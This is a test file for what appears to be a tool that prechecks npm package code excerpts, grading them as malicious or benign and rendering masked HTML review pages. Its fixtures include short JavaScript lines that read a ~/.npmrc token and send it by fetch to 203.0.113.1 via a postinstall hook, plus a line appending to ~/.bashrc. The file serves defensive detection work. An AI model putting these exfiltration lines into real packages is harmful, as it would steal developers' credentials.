import base64
import json

from data.scripts.ai_precheck import assess, precheck, run, signals
from data.scripts.review_evidence import encode_items, to_html


def lines(*texts):
    return [{"line": number, "text": text} for number, text in enumerate(texts, 1)]


def test_malicious_needs_a_strong_sign():
    exfil = signals(lines("const t = fs.readFileSync(os.homedir() + '/.npmrc');", "https.request({host: 'x'}).end(t);"))
    assert assess("malicious", exfil, [])[0] == "khớp"
    assert assess("malicious", signals(lines("console.log('hi');")), [])[0] == "nghi ngờ"
    assert assess("malicious", signals(lines("require('child_process').exec('ls');")), [])[0] == "cần xem"


def test_benign_flags_what_does_not_fit():
    assert assess("benign", signals(lines("console.log('built');")), [])[0] == "khớp"
    assert assess("benign", signals(lines("execSync('node-gyp rebuild');")), [])[0] == "cần xem"
    assert assess("benign", signals(lines("eval(code);")), [])[0] == "nghi ngờ"
    assert assess("benign", {}, ["cited line outside file"]) == ("nghi ngờ", "bước bằng chứng báo: cited line outside file")


def test_round_writes_csv_and_html_without_verbatim_code(tmp_path):
    results = [{"id": "r1", "package": "p@1", "label": "malicious", "source": "s", "file": "a.js", "lines": "1-2",
                "problems": [], "hooks": {"postinstall": "node a.js"},
                "excerpt": lines("const t = fs.readFileSync('/home/u/.npmrc');", "fetch('http://203.0.113.1', {body: t});")}]
    items = encode_items(results)
    (tmp_path / "round-10.json").write_text(json.dumps(items), encoding="utf-8")
    summary = run(10, tmp_path, tmp_path / "out")
    assert summary == {"round": 10, "rows": 1, "checks": {"khớp": 1}}
    page = (tmp_path / "round-10.html").read_text(encoding="utf-8")
    assert "readFileSync" not in page and "&#x" not in page and "data-x=" in page  # masked, not verbatim
    from data.scripts.review_evidence import VIEW_KEY
    blob = page.split("<pre data-x='", 1)[1].split("'", 1)[0]
    shown = bytes(byte ^ VIEW_KEY[index % len(VIEW_KEY)] for index, byte in enumerate(base64.b64decode(blob))).decode()
    assert "readFileSync('/home/u/.npmrc')" in shown and shown.lstrip().startswith("1 |")
    assert "chưa phải kiểm tra" in page
    assert "readFileSync" not in (tmp_path / "round-10.json").read_text(encoding="utf-8")
    assert precheck(items)[0]["ai_signals"].startswith("secret_path")
    assert base64.b64decode(items[0]["excerpt"][0]["b64"]).decode().startswith("const t")


def test_html_without_notes_still_renders():
    page = to_html(1, encode_items([{"id": "x", "package": "p@1", "label": "benign", "source": "s", "file": "a.js",
                                     "lines": "1", "problems": [], "excerpt": lines("a")}]))
    assert "Kiểm tự động" not in page.split("</p>", 1)[1] and "<pre data-x=" in page


def test_broad_signs_alone_do_not_raise_doubt_on_benign_installers():
    installer = signals(lines("fs.mkdirSync(path.join(os.tmpdir(), 'x'));", "// see https://example.com/docs",
                              "const arch = process.env.npm_config_arch;"))
    assert assess("benign", installer, [])[0] == "khớp"  # broad families only: informational
    assert assess("benign", signals(lines("execSync('node-gyp rebuild');")), [])[0] == "cần xem"
    assert assess("benign", signals(lines("fs.appendFileSync(os.homedir() + '/.bashrc', x);")), [])[0] == "nghi ngờ"
